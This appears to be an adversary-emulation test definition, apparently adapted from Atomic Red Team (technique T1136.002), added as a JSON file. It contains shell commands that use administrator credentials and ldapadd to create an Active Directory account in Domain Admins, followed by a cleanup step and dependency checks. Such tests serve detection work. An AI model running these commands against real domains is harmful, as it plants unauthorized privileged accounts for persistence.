@@ -1,0 +1,129 @@
+{
+  "id": "562aa072-524e-459a-ba2b-91f1afccf5ab",
+  "name": "Active Directory Create Admin Account",
+  "description": "Use Admin Credentials to Create A Domain Admin Account\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "c832444b-c859-4edc-aaa3-84194acc264c",
+      "type": "execute-command",
+      "data": {
+        "command": "echo \"dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}\" \u003e tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "dbe2dcba-9176-4be2-98a1-8826887ae47c",
+      "type": "execute-command",
+      "data": {
+        "command": "echo removing Atomic User (temporary user)\necho \"dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" \u003e deleteuser.ldif\nldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3fc61d9b-c58c-48c5-a39d-b1cc209d32ae",
+      "name": "Check dependency 1/1",
+      "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available\n",
+      "type": "execute-command",
+      "data": {
+        "command": "which ldapadd \u0026\u0026 which ldapmodify\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9889acd1-9c45-4902-be6e-9c5a1450ecc0",
+      "name": "Resolve dependency 1/1",
+      "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available\n",
+      "type": "execute-command",
+      "data": {
+        "command": "echo ldapadd or ldapmodify not found; exit 1\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6ebe0fc7-ab63-419a-b8cd-021eabffd9c7",
+      "name": "Re-check dependency 1/1",
+      "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available\n",
+      "type": "execute-command",
+      "data": {
+        "command": "which ldapadd \u0026\u0026 which ldapmodify\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "c832444b-c859-4edc-aaa3-84194acc264c",
+      "p": "on-success",
+      "o": "dbe2dcba-9176-4be2-98a1-8826887ae47c"
+    },
+    {
+      "s": "c832444b-c859-4edc-aaa3-84194acc264c",
+      "p": "on-failure",
+      "o": "dbe2dcba-9176-4be2-98a1-8826887ae47c"
+    },
+    {
+      "s": "3fc61d9b-c58c-48c5-a39d-b1cc209d32ae",
+      "p": "on-success",
+      "o": "c832444b-c859-4edc-aaa3-84194acc264c"
+    },
+    {
+      "s": "3fc61d9b-c58c-48c5-a39d-b1cc209d32ae",
+      "p": "on-failure",
+      "o": "9889acd1-9c45-4902-be6e-9c5a1450ecc0"
+    },
+    {
+      "s": "9889acd1-9c45-4902-be6e-9c5a1450ecc0",
+      "p": "on-success",
+      "o": "6ebe0fc7-ab63-419a-b8cd-021eabffd9c7"
+    },
+    {
+      "s": "6ebe0fc7-ab63-419a-b8cd-021eabffd9c7",
+      "p": "on-failure",
+      "o": "c832444b-c859-4edc-aaa3-84194acc264c"
+    }
+  ],
+  "tags": [
+    "T1136.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "domain",
+      "type": "string",
+      "description": "The domain to be tested",
+      "value": "example"
+    },
+    {
+      "name": "top_level_domain",
+      "type": "string",
+      "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
+      "value": "test"
+    },
+    {
+      "name": "admin_user",
+      "type": "string",
+      "description": "username@domain of a user with admin privileges",
+      "value": "admin@example.test"
+    },
+    {
+      "name": "admin_password",
+      "type": "string",
+      "description": "password of the user with admin privileges referenced in admin_user",
+      "value": "s3CurePssw0rD!"
+    },
+    {
+      "name": "domain_controller",
+      "type": "string",
+      "description": "Name of the domain_controller machine, defined in etc/hosts",
+      "value": "adVM"
+    }
+  ]
+}
